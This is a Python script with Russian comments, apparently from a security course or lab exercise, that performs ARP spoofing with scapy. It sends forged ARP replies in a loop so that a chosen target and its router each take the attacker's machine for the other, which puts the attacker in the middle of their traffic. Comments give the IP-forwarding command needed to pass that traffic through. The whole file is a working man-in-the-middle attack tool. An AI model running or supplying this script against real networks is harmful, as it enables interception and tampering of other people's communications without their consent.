#! /usr/bin/env python3

 #  arp_spoof.py -t 10.0.2.10 -r 10.0.2.1
#  Подменяем ARP-таблицу
# чтобы атакуемая машина считала нас роутером
# и роутер считал нас атакуемой машиной
# таким образом мы будем MITM и весь трафик пойдет через нас.
# также не забыть активировать перенаправление портов/ port forwarding в консоли.
# echo  1 > /proc/sys/net/ipv4/ip-forward

import scapy.all as scapy
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target attacked IP")
    parser.add_argument("-r", "--router", dest="router", help="Router IP")
    args = parser.parse_args()
    return args

def get_mac(ip):
    # return MAC by IP
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # get only 1-st (one PC only) answer -[0], only response - [1], only MAC - hwsrc
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target
gateway_ip = options.router

# target_ip = '10.0.2.10'
# gateway_ip = '10.0.2.1'

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)    # tell target-PC I'm router
        spoof(gateway_ip, target_ip)    # tell router I'm target-PC
        sent_packets_count += 2
        print('\r[+] Packets sent: ' + str(sent_packets_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detecting  Ctrl + C  ..........  Resetting ARP tables.......Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
